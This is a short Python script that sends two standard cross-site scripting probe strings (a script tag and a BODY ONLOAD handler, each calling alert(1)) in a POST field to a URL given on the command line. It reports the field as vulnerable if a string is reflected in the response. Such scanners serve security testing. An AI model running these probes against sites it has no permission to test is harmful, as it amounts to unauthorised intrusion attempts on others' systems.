import requests
import sys

def test_xss(url, payloads):
    for payload in payloads:
        try:
            req = requests.post(url, data={"input": payload})
            if payload in req.text:
                print("Parameter vulnerable")
                print("Attack string:", payload)
                print(req.text)
                break
        except requests.exceptions.RequestException as e:
            print("Error:", e)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    payloads = ['<script>alert(1);</script>', '<BODY ONLOAD=alert(1)>']
    test_xss(url, payloads)
